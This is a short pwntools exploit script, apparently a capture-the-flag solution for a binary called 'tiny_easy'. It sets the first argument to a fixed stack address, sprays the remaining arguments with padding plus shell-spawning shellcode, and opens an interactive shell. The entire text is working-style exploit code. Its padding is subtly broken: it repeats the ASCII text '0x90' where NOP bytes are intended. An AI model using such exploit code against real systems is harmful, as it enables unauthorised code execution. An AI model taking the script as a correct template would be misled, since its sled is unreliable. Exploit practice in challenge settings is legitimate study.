from pwn import *

# Specify the binary
binary_path = './tiny_easy'

# Define the custom argv array
args = [p32(0xFFFFD050)]
padding = b'0x90' * 10000

paylod = padding + asm(shellcraft.sh())

for _ in range(20):
        args.append(paylod)

# Start the process with the modified argv
p = process(executable=binary_path, argv=args)
p.interactive()
#response = p.recv()
#print(response)
